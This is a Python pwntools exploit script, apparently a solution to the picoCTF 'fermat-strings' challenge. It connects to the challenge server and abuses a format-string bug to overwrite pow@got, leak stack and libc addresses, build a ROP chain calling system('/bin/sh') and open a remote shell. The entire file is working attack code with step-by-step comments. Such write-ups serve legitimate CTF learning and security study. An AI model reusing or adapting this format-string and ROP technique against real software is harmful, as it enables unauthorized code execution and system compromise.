# picoCTF-fermat-strings-exploit.py
# by Aidan Wech (ahwech)
# nc mars.picoctf.net 31929

from pwn import *

def main():
    # connection variables
    host = "mars.picoctf.net"
    port = 31929

    # leak __libc_start_main_ret and a stack address variables
    pow_got = 0x601040                                                                                  # pow@got address
    main = 0x400837                                                                                     # main address
    beginning_format_string_length = len("Calculating for A: 12345678900")                              # beginning length of format string
    num_of_s = (main & 0xffff) - beginning_format_string_length                                         # number of bytes needed to change pow@got's entry to main
    stack_addr_format_arg = 5                                                                           # format string location of a stack address
    libc_addr_format_arg = 109                                                                          # format string location of __libc_start_main_ret
    pow_got_format_arg = 15                                                                             # format string location of pow@got in our payload

    # payload to reroute code execution to keep reading input AND obtain leaks
    leak_libc_addr_payload = flat(
        "12345678900",                                                                                  # create a number bigger than INT_MAX to bypass atoi() check
        f"%{num_of_s}s%{pow_got_format_arg}$hn|%{stack_addr_format_arg}$p|%{libc_addr_format_arg}$p|",  # change pow@got's entry to point to main, leak __libc_start_main_ret
        "AAAA",                                                                                         # padding for alignment
        p64(pow_got)                                                                                    # pow@got address to write bytes to
    )

    # connect to instance
    p = remote(host, port)

    # bypass ASLR by leaking __libc_start_main_ret and stack by overwriting pow() GOT entry
    p.recvuntil(b"A: ", timeout=1)
    p.sendline(leak_libc_addr_payload)
    p.recvuntil(b"B: ", timeout=1)
    p.sendline(b"1")
    leak = p.recvline(timeout=1).decode().rstrip("\n")
    stack_leak = int(leak.split("|")[1][2:], 16)
    libc_start_main_ret = int(leak.split("|")[2][2:], 16)
    log.info(f"Stack Leak: {hex(stack_leak)}")
    log.info(f"__libc_start_main_ret: {hex(libc_start_main_ret)}")
    
    # calculate system, /bin/sh, and stack address of __libc_start_main_ret
    # libc offsets are from "libc6_2.31-0ubuntu7_amd64" and found using "libc.rip"
    leak_offset = 0x270b3                                                                               # __libc_start_main_ret libc offset
    system_offset = 0x55410                                                                             # system libc offset
    bin_sh_offset = 0x1b75aa                                                                            # "/bin/sh" libc offset
    stack_rop_chain_offset = 0x4a8                                                                      # __libc_start_main_ret stack address offset
    libc = libc_start_main_ret - leak_offset                                                            # libc base address
    system = libc + system_offset                                                                       # system address
    bin_sh = libc + bin_sh_offset                                                                       # "/bin/sh" address
    stack_rop_chain = stack_leak + stack_rop_chain_offset                                               # __libc_start_main_ret stack address

    # shell variables
    pop_rdi = 0x40028d                                                                                  # pop rdi ; ret
    leave = 0x400ac2                                                                                    # leave ; ret
    ret = 0x40028e                                                                                      # ret
    pop_rdi_stack_addr = stack_rop_chain + 8                                                            # pop_rdi stack address
    bin_sh_stack_addr = stack_rop_chain + 16                                                            # "/bin/sh" stack address
    system_stack_addr = stack_rop_chain + 24                                                            # system stack address

    def write_value_to_stack(data: int, addr: int):
        # our format string writing only allows us to write one short of data at a time, otherwise printf throws an error
        # this payload takes data and an address as arguments and creates a format string to write said data to the address
        payload = flat(
            "12345678900",                                                                              # create a number bigger than INT_MAX to bypass atoi() check
            f"%{data - beginning_format_string_length}s%14$n"                                           # write the data at the 14th pointer, use int size to eliminate any unwanted bytes
        )

        payload += (b"A" * (32 - len(payload)))                                                         # padding to align our address into %14$p
        payload += p64(addr)                                                                            # the address that we write to

        # deliver the payload
        p.recvuntil(b"A: ", timeout=1)
        p.sendline(payload)
        p.recvuntil(b"B: ", timeout=1)
        p.sendline(b"1")
        p.recvline(timeout=5)
        return

    # write our shell ROP chain to the stack, one short at a time
    write_value_to_stack((ret & 0xffff), stack_rop_chain)
    write_value_to_stack(((ret & 0xffff0000) >> 16), stack_rop_chain + 2)
    write_value_to_stack((pop_rdi & 0xffff), pop_rdi_stack_addr)
    write_value_to_stack(((pop_rdi & 0xffff0000) >> 16), pop_rdi_stack_addr + 2)
    write_value_to_stack((bin_sh & 0xffff), bin_sh_stack_addr)
    write_value_to_stack(((bin_sh & 0xffff0000) >> 16), bin_sh_stack_addr + 2)
    write_value_to_stack(((bin_sh & 0xffff00000000) >> 32), bin_sh_stack_addr + 4)
    write_value_to_stack((system & 0xffff), system_stack_addr)
    write_value_to_stack(((system & 0xffff0000) >> 16), system_stack_addr + 2)
    write_value_to_stack(((system & 0xffff00000000) >> 32), system_stack_addr + 4)

    # everytime we redirect back to main, the base pointer is pushed onto the stack and takes the value of the stack pointer
    # the stack pointer is then sent back 0x330 bytes as defined by main+4
    # we eventually want to bring the stack pointer back so that it reaches __libc_start_main_ret's position in the stack
    # we can do this by changing pow@got to contain a "leave ; ret" gadget
    # with this gadget, the stack pointer becomes the base pointer, and the base pointer becomes its previous iteration
    # since we keep calling pow@plt in a loop, we will eventually reach __libc_start_main_ret's location on the stack!
    # this will change pow@got to leave gadget
    write_value_to_stack(leave, pow_got)

    # interact with shell
    p.interactive()

if __name__ == "__main__":
    main()